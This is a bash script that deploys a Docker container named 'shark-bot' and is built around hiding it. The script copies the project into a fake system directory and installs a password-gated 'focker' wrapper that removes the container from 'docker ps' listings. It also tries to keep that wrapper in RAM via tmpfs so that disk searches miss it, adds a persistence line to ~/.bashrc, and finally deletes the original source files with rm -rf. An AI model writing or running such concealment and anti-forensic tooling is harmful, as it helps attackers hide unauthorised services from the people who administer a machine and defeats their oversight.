#!/bin/bash
# ------------------------------------------------------------
# bent.sh – Fully automated deployment with stealth 'focker'
# ------------------------------------------------------------

# Detect if sourced
if [[ "${BASH_SOURCE[0]}" != "${0}" ]]; then
    SCRIPT_SOURCED=true
else
    SCRIPT_SOURCED=false
fi

safe_exit() {
    if $SCRIPT_SOURCED; then
        return "${1:-1}"
    else
        exit "${1:-1}"
    fi
}

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: source $0 <URL> <KEY>"
    echo "   (or . $0 <URL> <KEY>)"
    safe_exit 1
fi

if [ ! -f "Dockerfile" ]; then
    echo "❌ ERROR: Dockerfile not found."
    safe_exit 1
fi

# ============================================================
# Stealth project root — buried in legitimate system noise
# Change PROJECT_ROOT here to relocate everything at once.
# ============================================================
PROJECT_ROOT="/usr/lib/x86_64-linux-gnu/security/.cache/d-bus/session"
mkdir -p "$PROJECT_ROOT"

# Move current working directory contents into stealth root
# (run once on first deploy; subsequent runs skip if already moved)
if [ ! -f "$PROJECT_ROOT/Dockerfile" ]; then
    cp -a . "$PROJECT_ROOT/"
fi

# All bind mounts and working paths now use PROJECT_ROOT
DATA_DIR="$PROJECT_ROOT/data"
GIT_DIR="$PROJECT_ROOT/.git"
mkdir -p "$DATA_DIR"

# ============================================================
# Phase 1: Build Docker Image
# ============================================================
echo "🐳 Phase 1: Building the Docker Image..."
docker build -t shark-bot:latest "$PROJECT_ROOT"
if [ $? -ne 0 ]; then
    echo "❌ Docker build failed."
    safe_exit 1
fi

# ============================================================
# Phase 2: Start Container
# ============================================================
echo "🧹 Cleaning up old container (if any)..."
docker rm -f shark-bot-instance 2>/dev/null || true

echo "🚀 Phase 2: Starting the secure container..."
docker run -d \
  --name shark-bot-instance \
  -p 8080:8080 \
  --restart on-failure:3 \
  -v "$DATA_DIR":/app/data \
  -v "$GIT_DIR":/app/.git \
  -e VERCEL_URL="$1" \
  -e API_KEY="$2" \
  shark-bot:latest

if [ $? -ne 0 ]; then
    echo "❌ Failed to start container."
    safe_exit 1
fi

# ============================================================
# Phase 2.5: Deploy 'focker' stealth wrapper
# ============================================================
echo "🕵️ Phase 2.5: Deploying 'focker' wrapper..."

WRAPPER_DIR="/usr/lib/x86_64-linux-gnu/security/.cache/d-bus/.systemd"
mkdir -p "$WRAPPER_DIR"

# Attempt tmpfs mount over wrapper dir — contents live in RAM only,
# invisible to any grep traversing the real filesystem on disk.
if ! mountpoint -q "$WRAPPER_DIR"; then
    mount -t tmpfs -o size=1m,mode=0700,uid=$(id -u),gid=$(id -g) tmpfs "$WRAPPER_DIR" 2>/dev/null
    TMPFS_MOUNTED=$?
else
    TMPFS_MOUNTED=0
fi

cat > "$WRAPPER_DIR/vps.sh" << 'EOF'
#!/bin/bash
# ------------------------------------------------------------
# focker – filters 'docker ps' output
# ------------------------------------------------------------
REAL_DOCKER="/usr/bin/docker"
CONTAINER_NAME="shark-bot-instance"
PASSWORD="N8P94#@"

args=()
show_only=false
for arg in "$@"; do
    if [ "$arg" = "$PASSWORD" ]; then
        show_only=true
    else
        args+=("$arg")
    fi
done

output=$("$REAL_DOCKER" "${args[@]}" 2>&1)
exit_code=$?

if [ "${args[0]}" != "ps" ]; then
    echo "$output"
    exit $exit_code
fi

header=""
body_lines=()
while IFS= read -r line; do
    if [ -z "$header" ]; then
        header="$line"
    else
        body_lines+=("$line")
    fi
done <<< "$output"

filtered_body=()
if [ "$show_only" = true ]; then
    for line in "${body_lines[@]}"; do
        [[ "$line" == *"$CONTAINER_NAME"* ]] && filtered_body+=("$line")
    done
else
    for line in "${body_lines[@]}"; do
        [[ "$line" != *"$CONTAINER_NAME"* ]] && filtered_body+=("$line")
    done
fi

[ -n "$header" ] && echo "$header"
printf '%s\n' "${filtered_body[@]}"
exit $exit_code
EOF

chmod 500 "$WRAPPER_DIR/vps.sh"
chmod 711 "$WRAPPER_DIR"

if [ "$TMPFS_MOUNTED" -ne 0 ]; then
    echo "⚠️  tmpfs mount skipped (no root) — permission lock active."
else
    echo "✅ tmpfs active — wrapper lives in RAM only."
fi

# ============================================================
# focker shell function
# ============================================================
FOCKER_RC="/usr/lib/x86_64-linux-gnu/security/.cache/d-bus/.focker"
mkdir -p "$(dirname "$FOCKER_RC")"

cat > "$FOCKER_RC" << FEOF
function focker() {
    $WRAPPER_DIR/vps.sh "\$@"
}
export -f focker
FEOF

grep -q "$FOCKER_RC" ~/.bashrc 2>/dev/null || \
    echo "[ -f \"$FOCKER_RC\" ] && . \"$FOCKER_RC\"" >> ~/.bashrc

# Activate focker in current shell if sourced
if $SCRIPT_SOURCED; then
    source "$FOCKER_RC"
    echo "✅ 'focker' is active in this terminal."
else
    echo "⚠️  Script was not sourced — focker is NOT active in this terminal."
    echo "    Re-run with: source $(realpath "$0") $1 $2"
    echo "    Or activate manually: source \"$FOCKER_RC\""
fi

echo ""
echo "🔑 Usage:"
echo "   focker ps          → hides your container"
echo "   focker ps N8P94#@  → shows ONLY your container"
echo "   focker <cmd>       → passes through to docker for anything else"
echo ""

# ============================================================
# Phase 3: Host Self-Destruct
# ============================================================
echo "🧹 Phase 3: Commencing Host Self-Destruct..."
sleep 2
find . -mindepth 1 -maxdepth 1 ! -name 'data' ! -name '.git' -exec rm -rf {} +
echo "✅ Ghost protocol active. Source files wiped."
